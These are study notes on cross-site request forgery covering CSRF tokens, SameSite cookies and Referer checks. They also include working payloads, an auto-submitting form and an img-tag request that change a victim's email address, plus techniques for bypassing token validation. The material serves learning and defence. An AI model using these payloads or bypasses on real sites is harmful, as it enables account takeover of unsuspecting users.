CSRF

CSRF token :

A common way to share CSRF tokens with the client is to include them as a hidden parameter in an HTML form, for example:

<form name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="example@normal-website.com">
    <input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u">
    <button class='button' type='submit'> Update email </button>
</form>

Submitting this form results in the following request:

POST /my-account/change-email HTTP/1.1
Host: normal-website.com
Content-Length: 70
Content-Type: application/x-www-form-urlencoded

csrf=50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&email=example@normal-website.com

The field containing the CSRF token should be placed as early as possible within the HTML document, ideally before any non-hidden input fields and before any 
locations where user-controllable data is embedded within the HTML. This mitigates against various techniques in which an attacker can use crafted data to manipulate 
the HTML document and capture parts of its contents.
----------------------------------------------------
Common defences against CSRF:

-CSRF tokens - A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. 
When attempting to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token in the request. 


-SameSite cookies - SameSite is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites. 
As requests to perform sensitive actions typically require an authenticated session cookie, the appropriate SameSite restrictions may prevent an attacker from 
triggering these actions cross-site. Since 2021, Chrome enforces Lax SameSite restrictions by default. 

Set-Cookie: session=0F8tgdOhi9ynR1M9wa3ODa; SameSite=Strict

When setting a cookie with SameSite=None, the website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted messages over 
HTTPS. Otherwise, browsers will reject the cookie and it won't be set.

Set-Cookie: trackingId=0F8tgdOhi9ynR1M9wa3ODa; SameSite=None; Secure

-Referer-based validation - Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request 
originated from the application's own domain. This is generally less effective than CSRF token validation.
-----------------------------General payload


CSRF payload without user interaction: (he still need to visit the page with this html)
<html>
    <body>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>

----------Other payload
If the request to change email address(the action you want) can be performed with the GET method, then a self-contained attack would look like this:

<img src="//vulnerable-website.com/email/change?email=pwned@evil-user.net">

------------Validation skip on different request type
Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.
In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack: 

GET /email/change?email=pwned@evil-user.net HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

-----------Validation skip without token
Some applications correctly validate the token when it is present but skip the validation if the token is omitted.
In this situation, the attacker can remove the entire parameter containing the token (not just its value) to bypass the validation and deliver a CSRF attack

------------------------Global pools vuln

Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool 
of tokens that it has issued and accepts any token that appears in this pool.
In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF 
attack. 
--------------------------------Different framework cookie-csrf(not-tied)

Some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can 
easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=pwn@normal-user.com

This situation is harder to exploit but is still vulnerable. If the web site contains any behavior that allows an attacker to set a cookie in a victim's browser,
 then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the 
 cookie-setting behavior to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack. 
------------





